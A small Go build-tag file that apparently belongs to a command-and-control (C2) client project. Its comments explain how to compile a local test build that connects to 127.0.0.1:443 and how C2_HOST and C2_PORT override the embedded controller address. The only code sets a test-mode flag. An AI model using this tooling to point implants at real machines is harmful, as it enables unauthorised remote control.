//go:build localtest

// Local C2 test build — compile together with lastfinalversion2.go:
//
//	npm run build:go:client-local
//	# or: go build -tags localtest -o lastfinalversion2_local.exe lastfinalversion2.go lastfinalversion2_localtest.go
//
// Behavior:
//   - Connects to 127.0.0.1:443 (same default TCP port as server.js / settings).
//   - Override anytime: set C2_HOST and/or C2_PORT before running the binary.
//   - Without this file / tag, the client uses embedC2Host/embedC2Port in lastfinalversion2.go (or -ldflags -X); C2_HOST / C2_PORT still override.
//
// Run server locally first, e.g.: npm start  (TCP bind from c2.sqlite settings, often 443)

package main

func init() {
	c2LocalTestMode = true
}
